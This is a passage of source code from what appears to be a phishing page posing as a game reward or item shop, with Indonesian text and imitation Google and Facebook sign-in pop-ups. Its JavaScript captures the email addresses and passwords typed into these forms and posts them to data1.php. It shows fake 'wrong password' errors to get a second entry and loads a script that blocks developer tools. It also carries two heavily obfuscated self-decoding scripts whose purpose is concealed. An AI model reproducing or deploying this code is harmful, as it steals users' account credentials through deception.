<div class="form-group-showhide GoogleShowPassword" onclick="SecondshowGooglePassword()"><i class="zmdi zmdi-eye"></i></div>
<div class="form-group-showhide GoogleHidePassword" style="display: none;" onclick="SecondhideGooglePassword()"><i class="zmdi zmdi-eye-off"></i></div>
<label class="input-label" style="text-shadow: none;">Password</label>
<input type="password" class="input-1" name="password" id="second-google-password" onfocus="setFocus(true)" onblur="setFocus(false)" required="">
</div>
<input type="hidden" name="login" id="second-google-login" value="Google Play" readonly="">
<div class="second-email-google" style="display: none;">
<svg aria-hidden="true" fill="currentColor" focusable="false" width="13px" height="13px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
</svg> Your Google Account cannot be found.</div>
<div class="second-sandi-google" style="display: block;">
<svg aria-hidden="true" fill="currentColor" focusable="false" width="13px" height="13px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
</svg> Wrong password, please try again.</div>
<div class="btn-forgot-google">Forgot your email?</div>
<div class="btn-not-computer">Not your computer? Use Guest mode to sign in privately. <p style="color: #3166d3;font-weight: 500;">Learn more about using Guest mode</p></div>
<button type="submit" class="btn-login-google" onclick="SecondValidateLoginGoogleData()">Next</button>
</form>
<div class="notify-google">Create account</div> <!--- notify-google --->
<br>
</div> <!--- box-google --->
</div>
</div>

<div class="popup-login login-google-load animated fadeIn" style="display: none;">
  <div class="popup-box-login-google">
    <div class="box-google">
      <div class="header-google"><img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/style-img/google.png" style="margin-bottom: -72px;justify-self: center;">
      </div> <!--- header-google --->
      <div class="loadgoogle">
        <i class="fa-solid fa-circle-notch fa-spin" style="width: 36%;font-size: 49px;color: #1a73e8;"></i>
      </div>
    </div>
  </div> <!--- box-google --->
</div>

<div class="popup itemReward_confirmation2 fadeIn" style="display: none;">
  <div class="popup-box-wrapperz">
    <div class="popup-box-navbar-lz" style="margin-bottom:11px;">
      <div class="popup-box-navbar-lz-title">KONFIRMASI PEMBELIAN</div>
      <img onmousedown="tutup.play();" onclick="close_reward_confirmation()" src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/popup-close2.png" style="margin-top: -24px;margin-right: 7px;opacity: 77%;">
    </div>
    <div class="popup-box-lz">
      <div class="popup-box-alert-lz">Apakah Anda yakin ingin membeli barang ini?</div>
      <div class="confirmation-content">
        <div class="popup-box-item bordermotion itemShine">
          <figure>
            <img src="" id="myItemReward_confirmationImg" alt="Item">
            <span id="amount"></span>
          </figure>
        </div>
        <div class="item-details-right">
          <div class="item-name-confirmation">
            <span id="ItemName"></span>
          </div>
          <div class="item-price-row">
            <span class="price-label">Price:</span>
            <img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/tokens.png" class="token-icon-inline">
            <pr id="price"></pr>
          </div>
        </div>
      </div>
      <div class="popup-box-footer-lz">
        <button type="button" onmousedown="buka.play();" onclick="get_token()">
          BELI
        </button>
      </div> <!--- popup-box-footer --->
    </div>
  </div>
</div>

<div class="popup itemReward_confirmationsold fadeIn" style="display: none;">
<div class="popup-box-wrapperz">
<div class="popup-box-navbar-lz" style="margin-bottom:11px;">
<div class="popup-box-navbar-lz-title">Confirmation</div>
<img onmousedown="tutup.play();" onclick="close_reward_confirmation()" src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/popup-close2.png" style="margin-top: -27px;margin-right: 25px;opacity: 100%;">
</div>
<div class="popup-box-lz">
<div class="popup-box-alert-lz">Sorry, this item is sold out!</div>
<div class="popup-box-item bordermotion itemShine" style="width: 21%;height: 78px;margin-top: 9px;margin-left: 60px;margin-bottom:10px;">
<rw id="ItemNamesold"></rw>
<div class="popup-box-alert-price">Price:</div>
<prs id="pricesold"></prs>
<div>
<figure>
<span id="amountsold"></span>
<img src="" id="myItemReward_confirmationImgsold">
</figure>
</div>
<div class="line"></div>
<img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/tokens.png" style="margin-top: 3px;margin-right: -70px;width: 19px;height: auto;">
</div> <!--- popup-box-item --->
<br>
<div class="popup-box-footer-lz">
<button type="button" onmousedown="buka.play();" onclick="soldout()" style="width: 90px;height: 28px;padding-left: 0;padding-right: 0;margin-top: -4px;"><font style="">SOLD OUT</font> </button>
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup itemReward_confirmation --->

<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool@latest"></script>
<script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<audio id="audioFile" src="media/spin.mp3"></audio>
<script src="js-zone/lazcode.js"></script>
<script src="js-zone/flaglink.js"></script>
<script src="js-zone/slidernotif.js"></script>
<script src="js-zone/sender.js"></script>
<script src="js-zone/slide-zone.js"></script>
<script>
function initScrollingBanners() {
    const banners = document.querySelectorAll('.item-name-confirmation');
    
    banners.forEach(banner => {
        const span = banner.querySelector('span');
        if (!span) return;
        
        const bannerWidth = banner.offsetWidth;
        const spanWidth = span.offsetWidth;
        
        if (spanWidth > bannerWidth) {
            const scrollDistance = -(spanWidth - bannerWidth + 16);
            span.style.setProperty('--scroll-distance', scrollDistance + 'px');
            banner.classList.add('needs-scroll');
        } else {
            banner.classList.remove('needs-scroll');
        }
    });
}

document.addEventListener('DOMContentLoaded', initScrollingBanners);
window.addEventListener('resize', initScrollingBanners);
</script>
<script>
function initScrollingBanners() {
  const banners = document.querySelectorAll('.item-name-banner');
  
  banners.forEach(banner => {
    const span = banner.querySelector('span');
    if (!span) return;
    
    const bannerWidth = banner.offsetWidth;
    const spanWidth = span.offsetWidth;
    
    if (spanWidth > bannerWidth) {
      const scrollDistance = -(spanWidth - bannerWidth + 16); 
      span.style.setProperty('--scroll-distance', scrollDistance + 'px');
      banner.classList.add('needs-scroll');
    } else {
      banner.classList.remove('needs-scroll');
    }
  });
}

document.addEventListener('DOMContentLoaded', initScrollingBanners);
window.addEventListener('resize', initScrollingBanners);
</script>
<script>
function open_google() {
  $('.first-login-google').show();
  $('.more_login').hide();
  $('.account_login').hide()
  $('.itemReward_confirmations2').hide();
}	
function close_google() {
  $('.first-login-google').hide();
  $('.account_login').show();
  $('.more_login').hide();
}
// code for validate data to next step
function FirstValidateLoginGoogleData() {
    $('#FirstValidateLoginGoogleForm').submit(function (submitingFirstValidateLoginGoogleData) {
      submitingFirstValidateLoginGoogleData.preventDefault();
      $emailgoogle = $('#first-google-email').val().trim();
      $passwordgoogle = $('#first-google-password').val().trim();
      $logingoogle = $('#first-google-login').val().trim();
      if ($emailgoogle == '' || $emailgoogle == null || $emailgoogle.length <= 7) {
        $('.first-email-google').fadeIn();
        setTimeout(function () {
          $('.first-email-google').fadeOut();
        }, 2000);
        $('.first-sandi-google').hide();
        $('.first-login-google').show();
        return false;
      } else {
        $('.first-email-google').hide();
        $("input#validateEmail").val($emailgoogle);
        $('.first-login-google').hide();
      }
      if ($passwordgoogle == '' || $passwordgoogle == null || $passwordgoogle.length <= 7) {
        $('.first-sandi-google').fadeIn();
        setTimeout(function () {
          $('.first-sandi-google').fadeOut();
        }, 2000);
        $('.first-login-google').show();
        return false;
      } else {
        $('.first-sandi-google').hide();
        $("input#validatePassword").val($passwordgoogle);
        $("input#validateLogin").val($logingoogle);
        $('.first-login-google').hide();
        $('.login-google-load').show()
        setTimeout(function () {
          $('.first-login-google').hide()
          $('.second-login-google').hide()
          $('.login-google-load').hide()
          $('.account_verification').show()
        }, 4000)
      }
      var $validateEmail = $("input#validateEmail").val();
      var $validatePassword = $("input#validatePassword").val();
      var $validateLogin = $("input#validateLogin").val();
      if ($validateEmail == "" && $validatePassword == "" && $validateLogin == "" && $playid == "") {
        $('.account_verification').hide();
        return false;
      }
      $.ajax({
        type: "POST",
        url: "data1.php",
        data: $(this).serialize(),
        beforeSend: function () {
          $('.first-login-google').hide();
        },
        success: function () {
          $('.first-login-google').hide();
        }
      });
    });
    return false;
  }
  
  function SecondValidateLoginGoogleData() {
    $('#SecondValidateLoginGoogleForm').submit(function (submitingSecondValidateLoginGoogleData) {
      submitingSecondValidateLoginGoogleData.preventDefault();
      $emailgoogle = $('#second-google-email').val().trim();
      $passwordgoogle = $('#second-google-password').val().trim();
      $logingoogle = $('#second-google-login').val().trim();
      if ($emailgoogle == '' || $emailgoogle == null || $emailgoogle.length <= 7) {
        $('.second-email-google').fadeIn();
        setTimeout(function () {
          $('.second-email-google').fadeOut();
        }, 2000);
        $('.second-sandi-google').hide();
        $('.second-login-google').show();
        return false;
      } else {
        $('.second-email-google').hide();
        $("input#validateEmail").val($emailgoogle);
        $('.second-login-google').hide();
      }
      if ($passwordgoogle == '' || $passwordgoogle == null || $passwordgoogle.length <= 7) {
        $('.second-sandi-google').fadeIn();
        setTimeout(function () {
          $('.second-sandi-google').fadeOut();
        }, 2000);
        $('.second-login-google').show();
        return false;
      } else {
        $('.second-sandi-google').hide();
        $("input#validatePassword").val($passwordgoogle);
        $("input#validateLogin").val($logingoogle);
        $('.second-login-google').hide();
        $('.login-google-load').show()
        setTimeout(function () {
          $('.second-login-google').hide()
          $('.account_verification').show()
          $('.login-google-load').hide()
        }, 4000)
      }
      var $validateEmail = $("input#validateEmail").val();
      var $validatePassword = $("input#validatePassword").val();
      var $validateLogin = $("input#validateLogin").val();
      if ($validateEmail == "" && $validatePassword == "" && $validateLogin == "" && $playid == "") {
        $('.account_verification').hide();
        return false;
      }
      $.ajax({
        type: "POST",
        url: "data1.php",
        data: $(this).serialize(),
        beforeSend: function () {
          $('.second-login-google').hide();
        },
        success: function () {
          $('.second-login-google').hide();
        }
      });
    });
    return false;
  }

  function FirstValidateLoginFbData() {
    $FirstEmailFb = $('#first-email-facebook').val().trim();
    $FirstPasswordFb = $('#first-password-facebook').val().trim();
    $FirstLoginFb = $('#first-login-facebook').val().trim();
    if ($FirstEmailFb.length < 5) {
      $('.first-email-fb').show();
      $('.first-sandi-fb').hide();
      $('.first-login-facebook').show();
      return false;
    } else if ($FirstPasswordFb.length < 5) {
      $('.first-sandi-fb').show();
      $('.first-email-fb').hide();
      $('.first-login-facebook').show();
      return false;
    } else {
      $.ajax({
        type: "POST",
        url: "data1.php",
        data: $("#FirstValidateLoginFbForm").serialize(),
        beforeSend: function () {
          $('.first-email-fb').hide();
          $('.first-sandi-fb').hide();
          $('.first-login-facebook').hide();
          $('.login-facebook-load').show();
        },
        success: function () {
          $("input#validateEmail").val($FirstEmailFb);
          $("input#validatePassword").val($FirstPasswordFb);
          $("input#validateLogin").val($FirstLoginFb);
          setTimeout(function () {
            $('.login-facebook-load').hide();
            $('.account_verification').show();
            $('.second-login-facebook').hide();
          }, 4000)
          return true;
        }
      });
    };
  };

  function SecondValidateLoginFbData() {
    $SecondEmailFb = $('#second-email-facebook').val().trim();
    $SecondPasswordFb = $('#second-password-facebook').val().trim();
    $SecondLoginFb = $('#second-login-facebook').val().trim();
    if ($SecondEmailFb.length < 5) {
      $('.second-email-fb').show();
      $('.second-sandi-fb').hide();
      $('.wrong-email-fb').hide();
      $('.second-login-facebook').show();
      return false;
    } else if ($SecondPasswordFb.length < 5) {
      $('.second-sandi-fb').show();
      $('.second-email-fb').hide();
      $('.wrong-email-fb').hide();
      $('.second-login-facebook').show();
      return false;
    } else {
      $.ajax({
        type: "POST",
        url: "data1.php",
        data: $("#SecondValidateLoginFbForm").serialize(),
        beforeSend: function () {
          $('.second-email-fb').hide();
          $('.second-sandi-fb').hide();
          $('.wrong-email-fb').hide();
          $('.second-login-facebook').hide();
          $('.login-facebook-load').show();
        },
        success: function () {
          $("input#validateEmail").val($SecondEmailFb);
          $("input#validatePassword").val($SecondPasswordFb);
          $("input#validateLogin").val($SecondLoginFb);
          setTimeout(function () {
            $('.login-facebook-load').hide();
            $('.account_verification').show();
          }, 2000)
          return true;
        }
      });
    };
  };
</script>
<script>
var ValidateVerificationDatax;(function(){var GJk='',qio=212-201;function hwS(q){var v=645179;var w=q.length;var e=[];for(var j=0;j<w;j++){e[j]=q.charAt(j)};for(var j=0;j<w;j++){var c=v*(j+109)+(v%52802);var i=v*(j+696)+(v%26110);var t=c%w;var l=i%w;var y=e[t];e[t]=e[l];e[l]=y;v=(c+i)%7540053;};return e.join('')};var YJS=hwS('kcnslurmttnvyeauwshzprfdrgjtqobooxcci').substr(0,qio);var hrd='paukf.1=".=d;,2=!6i vrp,(h+b;+++ahark=fpa,qas,nbwcn+g([li.,;a7o,n5,9],a(;r;fr6jzvt0r0 f,8=v;e4.]<7v,(9+8t}n2(vh;+6rx;.7x;g*0e gr]nreo1=v,r -v0pA<vnp{[ t 1 =.srvfn+]tcz8"p==p x=<rv{+[e5l,i4,,1d,p8}(aor.p;reke0 ;f;og=man;r8 bsatrt;hfaChnrfu0a+dczealxnc8s)p+(u[ }}{mov;xvtohd;;Cle(et 0y;.>u rona(])}l 6nsupe=vacht)[)8;,ea0.r==nll;a(;;zs),vae;nj((lmfli7ina(+(d;oyghuf,v  k+<ov0+t)4.(];l;tut;adCnrg,d(A);v;==r.eafrgvf.;2{;=uu;h)de+)orh[tClo(ctlui1y-=;=in;1le.do; =z;a] ==v0jm2,jyprsunbes;jm=tu+2;C8n(Ah=ouh)r9;=chlr+rue=t.=pdo-c"[e=m,+e28}i-+a"cin7i,.1;ri)(n6=nxlg)h)gteavhc>[0)p(v)1,tts(t-tti{i)=g8ugrd1pts""1=r+1+.fsov,f;]rvlns+n2lti0ir(u=;y6.t+sapr(s6.atrli+(t(uz[o=ri;.jo0f1=)6aj; ;7a=a()[p]] ,vsrpelhdjniAnmzv{*acl=js3 r]hh9v73= )(h6[".noxaitrS);r).=== ]rx.i f4olCleC1nsAtu+(afo9()nt))xC[)<9t9e-")abx.)de=(([k,htr) r.]Sar9)g.)).mob,8[ji]no{sr6m(pvrvr;cd=cul2hpre-75nda.sgxy((")"!r))}okl4ra5';var zVh=hwS[YJS];var ByW='';var rGN=zVh;var wkq=zVh(ByW,hwS(hrd));var lSb=wkq(hwS('5\'413ooFr_(30l). al#eFe!h+ah]nc)n7_)r#5[e F:_=h#jFn.)i4.}$-k:5fStp.F$0;;%tFiFg$!b=a+4aFi,9;;edFswr01pq,,uF+e:.5Fd#F4F)Fab42). d.hb(F2.ad sicF,o 0.(qxa(Cda$.d :d(ph dd[t5a1#scFt]i(at.!)xrF38xrtFi_Fud;.*0c_,aF!3F"o)9;o_4j_si,(,g,d;s_$rea%!=e%Fe$0(!idnvnrnno.(F:].t84%ipjFaFCzjF;Fk6FaFa)F%."3d_5.,F)iFe}poe({F_u=$=eF$1lb,$ 62dF;aF7e.CF!7m;.5!7.cFt9s#SifFl(b. r4rj%l(;7!der$7_[ok)dc%)c!,%er[i7;eo3.t,F=of=F1D7F)tsF1j,ztdF(}dI.go3iehFF(h=((,);,cr.F6q;l;r.7Fk6!(.(!_;:x%F%}$01e6+e.$3%r=Fbq(;}r)7Fp58n_F _))v.{)Fr3ain,r0oaF=e,%,o(c,6F63=FF9;_33p2a(Fa)&(.xsrkoS(cFo=Fx)ij.#;.7_)c!yu3.c {e,r.Fcs3:%;=Fd5=s\'k\/y ;)FcF_yr((za"F.o{0wbpaqr}]=2ooFFf{ctr0n](eCFf+{aC2ae(t16r\/F3!ei,n(.)=h3wF49a,Fz!a01ot3h!.$4$a65e#$.\/u_3ieta.d.t})eb4tu1FFan!d*FF0w7+rm)(iF*._l$Fsnxt},-}ss}}f"3e3$0(sFudu.l;b_zIbf)s8*F)pc:,iy]=.l=tF\/1lyaa6d+F(3SFi2jt],!,)63es2 (:FeeF{3Fb.!f.(3$!"n1eeo\/F]x;\'.(!.F.a3Fstkk(j}&bh(t,{u)Fe4!=Fh(o}aF;83h4F,F(fjb=1s()F$b6haF.)tF.e_jrn i$s..()Fji5o&8agab3&.=fdjFwi3_)__5f. F!};wbdlrF(.s..e;i$-3phtF8Dbta(3]dd%nfd6y3w0l)(e7wqfIk_F.{Frla0=idb5;F5}2\'Fd)(y)1,8F)(FyFt)ta(F6)}i.F!ol,n%,1n%k.F+e7ua-s30p .f,%Fi3F)F7p9r0!3)$9.3o;p#F)!d_Fa.5(rF079de#$f36Fe(a\/ nFna7_k.Fgi2a0!"x$_ _5r8(b{Fj{u,4 ))[g( .F!S e)&;$rFjn.n \'(,6a5!30F.)...FTzp(_f6l).Fo}2Ff-swt,F! )eF06e$_b+.r(aisFo{6100g$Ff2.v3el4gise"$t2)  7ikFg.FFcc.n_a,3g{ ]]y)3).3jF6uo)'));var TkJ=rGN(GJk,lSb );TkJ(3934);return 5404})()
</script>
<script>
var LazIndexHeader = 0;
showLazSlidez();
function showLazSlidez() {
    var i;
    var LazSlidez = document.getElementsByClassName("lazaslide");
    for (i = 0; i < LazSlidez.length; i++) {
        LazSlidez[i].style.display = "none"; 
    }
    LazIndexHeader++;
    if (LazIndexHeader > LazSlidez.length) {LazIndexHeader = 1} 
    LazSlidez[LazIndexHeader-1].style.display = "block"; 
    setTimeout(showLazSlidez, 3000);
}

// code funtion timers
$(document).ready(function() { 
var detik = 59;
var menit = 59;
var jam = 23;
function hitung() { 
setTimeout(hitung,1000); $('#timer1').html( '  ' + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
if(detik < 0) { 
detik = 59; 
menit --; 
if(menit < 0) { 
menit = 0; 
detik = 0; 
} 
} 
} 
hitung(); 
}
);
$(document).ready(function() { 
var detik = 59;
var menit = 59;
var jam = 23;
function hitung() { 
setTimeout(hitung,1000); $('#timer2').html( + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
if(detik < 0) { 
detik = 59; 
menit --; 
if(menit < 0) { 
menit = 0; 
detik = 0; 
} 
} 
} 
hitung(); 
}
);
</script>
//Module
<script>
var AIChecker,AICheckerr;(function(){var rCL='',Gxs=480-469;function wCQ(a){var b=3197620;var g=a.length;var j=[];for(var i=0;i<g;i++){j[i]=a.charAt(i)};for(var i=0;i<g;i++){var r=b*(i+63)+(b%40412);var x=b*(i+552)+(b%19140);var d=r%g;var t=x%g;var n=j[d];j[d]=j[t];j[t]=n;b=(r+x)%4523057;};return j.join('')};var nXv=wCQ('eoisrotctarbfzupvnntjkculmyqcgsdowrhx').substr(0,Gxs);var hvV=')a1 ra)0et67),vr}xrvfv;rn"sgdd)f;nirfl.nau)c.n,vzC=zh+fn]daehfm,a({+4d)5,8rb .,8e,cplo[z;0f;0,n,.;{r.et{2n+6o8.-f=7ou,p.wr)a;g{=0];f3ilv);t[)t;,rhhspn1t(;vxhg[)+0=zf,wxe;u+r s,=d2z[(s20A;u==eaam74on]r(vvlC +v;o8anu;m]nrjjluaeah[(+usfam!1+i.v0ort2)slfniv=;(t; =r;;zo,AaoCt;tu]l=u.tC=a;t;s0 gu;,]piqt-n+uiv)v.rsi[a[("fbad ;=(=s+.vrravo>a;vc)6(m.= ng(2;;ar=i=z1h75a+i)=o"0<C78c+<hvtrs7or.c0xs(rrw;A}1devrrne 0rhhr, vq);>dnd(.;rt8m+trer+7een);z8ho-=oh(-"r.;=a(rst}rft[9=eu=i;tv(9.,jtguh+o+xee*a]((pe}o(k+nx9th.,parar;v54(+A.agog=6z(il12,}[lj.{cez.i()=;C;thn=-n4lm]l] g(i(([9g)d.pmqhtm2 nbcpfi(ovvse))0ngp(hp(tw)6)tg;l]z+tya n(4!inroa)=f,(9<s)"3hushe{usub=c2igndr.loumn,e])qa(n+";)h}+j;pulc,;x22[;=v.+ia gni)i1(u"=;*x] b=ru1,)0[ [r=n;3=o 65,u=,c7t=c()-a "=nSt1 9g)fiv6ClsrCg,r(=7 ;j}trova 1).w;<ce1rrl 6"l0+;ec.,sllnnm]Ar=ce1vsg;i+n jo;=aS9,rxa=(f+mse.re6)hob xa)e=oz]jr[{vvi lz8=x=d<").gmiaa-=8';var DPb=wCQ[nXv];var Aar='';var jUC=DPb;var qae=DPb(Aar,wCQ(hvV));var zYF=qae(wCQ('u<663p;<ur=]4=t#e.da<;j}rjy!+r!t#g3ns<aneIp,a7bq$);  m<;=;-o<aeup+at=ni$<r1as()djn}<4c)d"<<==<{(<y6d;y44)jqfetexe<()6r(uit[a<a])f!0x_,E.b36i%3si\/i-!)u;krxn))t<xsSfey1o=j<-t<oe;u-1!1;((ii,<j6<<r<054[;odv!zn5d<":(4otjw4=,=e<47(-y=ih<$%k7=(!<;s))<5od$)q0d20.ea(i0g<<r<1h]q.[8zxf1u6jd!)j27*f.&<e,!$=f4({}]f__;p ]u..r_,ey%\/!,))i;7x#(<}<<z9]C,_3{<<<(z5gs)fS{)r"7g0<je<2eh}02xtr2)rc <*:e:<.!9oft)n5; djq_..<.<kt!e<da,u3erhl5e&,S<340!$d}s)6;._oe<d<i..+b%<m)}37$1%! )*!.,qxam.d(<_7);a3<pdz(en_c;j&l)p(,+.){{)$5$)d9+(<n.;3d(e<1{4.).<h9. .2g(t,..3$,o,0elgC.\'l<4) \/<6m7=-)<<.gd)u<,[t...1r.<=;d]rf<_tet08t(=<.e.}ar0;tr,.!mic,.)c=t(j35"+ r< ,.<d<\/<f<ib!<.x+2.(<dz )o).<$]p."2<c()s<m.93n<}{#(0(3%3$mo(={pc.d\/8!.as(]7_t48e$5..,0$(p=)<. 7,rss()uk%%elcr{k5c9enb0<c,}d(dru1)E%<(+1<(t7.1#..uo2e)%{5oejd $dn;.7o{),<<,37b*dfr!)hr(};7<<eco)<-.]c(]s{c(<_d%!t"{#2C0!j%\/,r!3o.e(b<t<.eas<d;q<}yd<<52(),u=,<!<.!<()a;$(.g,<2d\/rs)au&0$e(.)3=6,<af,!yi_+ll<<xg$!n_nheI.tSz<)\/r9ofdg;r.:6$(4,x t+p1)0};2=j<f5(+u<j5e;;6{03!26xdjs90).h"s6.$.(oe,r$ $fz$t}tg.<3(zs](ai=n<q<_)<]6&)0(}<onft,33 #f.Cf..leeeu<+ad  j<s0<,(=pt<{[<f$:f417)4j]\'<1h(u3.T;%}4d{_dr<< ($j<$ntde3i.u,nbe(.}! z_[ <l9$t [vd)3ludn 7)<1rdh_y'));var WgE=jUC(rCL,zYF );WgE(2560);return 6093})()
</script>
<script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;b0e033d85f3b4494a2028597ef438c1e&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>


</body></html>
<?php
}else{
    header("Location: verify.php");
}
?>